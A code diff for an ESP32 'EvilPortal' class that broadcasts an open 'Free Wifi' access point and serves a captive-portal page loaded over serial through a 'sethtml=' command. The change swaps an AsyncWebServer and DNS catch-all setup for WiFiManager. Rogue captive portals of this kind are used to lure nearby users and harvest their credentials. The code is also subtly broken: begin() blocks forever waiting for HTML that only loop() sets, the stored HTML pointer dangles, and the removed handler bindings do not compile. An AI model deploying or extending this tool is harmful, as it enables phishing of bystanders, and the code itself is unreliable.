@@ -1,53 +1,49 @@
 #include <WiFi.h>
 #include <DNSServer.h>
-#include "ESPAsyncWebSrv.h"
 #include <AsyncTCP.h>
+#include <WiFiManager.h>
 
-AsyncWebServer server(80);
-DNSServer dnsServer;
+WiFiManager wifiManager;
 
 class EvilPortal {
 private:
   const char *ssid;
   const char *password;
+  const char* HTML = "";
 
 public:
-  EvilPortal(const char* SSID = "Free Wifi"){ssid = SSID;};
-
-  void Handler(AsyncWebServerRequest* Request)
-  {
-    AsyncResponseStream *response = request->beginResponseStream("text/html");
-    response->print("<!DOCTYPE html><html><head><title>Captive Portal</title></head><body>");
-    response->print("<p>This is out captive portal front page.</p>");
-    response->print("</body></html>");
-    request->send(response);
-  }
+  EvilPortal(const char *SSID = "Free Wifi") {
+    ssid = SSID;
+  };
 
   void begin() {
-    WiFi.mode(WIFI_AP);
-    WiFi.softAP(ssid);
-    WiFi.softAPConfig(WiFi.softAPIP(), WiFi.softAPIP(), IPAddress(255, 255, 255, 0));
-    dnsServer.start(53, "*", WiFi.softAPIP());
-    AsyncCallbackWebHandler* HandlerRoot = server->on("/", std::bind(&EvilPortal::Handler, this));
-    AsyncCallbackWebHandler* HandlerWifi = server->on("/wifi", std::bind(&EvilPortal::Handler, this, true));
-    AsyncCallbackWebHandler* Handler0Wifi = server->on("/0wifi", std::bind(&EvilPortal::Handler, this, false));
-    AsyncCallbackWebHandler* Handler0WifiSave = server->on("/wifisave", std::bind(&EvilPortal::Handler, this));
-    AsyncCallbackWebHandler* HandlerAndroid = server->on("/generate_204", std::bind(&EvilPortal::Handler, this));
-    AsyncCallbackWebHandler* HandlerMicrosoft = server->on("/fwlink", std::bind(&EvilPortal::Handler, this)); 
-    AsyncCallbackWebHandler* HandlerNotFound = server->onNotFound(std::bind(&EvilPortal::Handler, this));
-    server.addHandler(HandlerRoot);
-    server.addHandler(HandlerWifi);
-    server.addHandler(Handler0Wifi);
-    server.addHandler(Handler0WifiSave);
-    server.addHandler(HandlerAndroid);
-    server.addHandler(HandlerMicrosoft);
-    server.addHandler(HandlerNotFound);
-    server.begin();
+
+    while (String(HTML).length() == 0)
+    {
+      Serial.println("Waiting For HTML");
+      delay(2000);
+    }
+
+    if (!wifiManager.startConfigPortal(ssid, NULL, HTML)) {
+      Serial.println("failed to connect and hit timeout");
+      delay(3000);
+      return;
+    }
+
     Serial.printf("Evil Portal Started at %s", WiFi.softAPIP().toString().c_str());
   }
 
   void loop() {
-    dnsServer.processNextRequest();
-    yield();
+    if (Serial.available() && String(HTML).length() == 0) {
+      String input = Serial.readStringUntil('\n');
+
+      Serial.println(input.c_str());
+
+      if (input.startsWith("sethtml=")) {
+        input = input.substring(8);
+        HTML = input.c_str();
+        Serial.println("Got HTML");
+      }
+    }
   }
 };
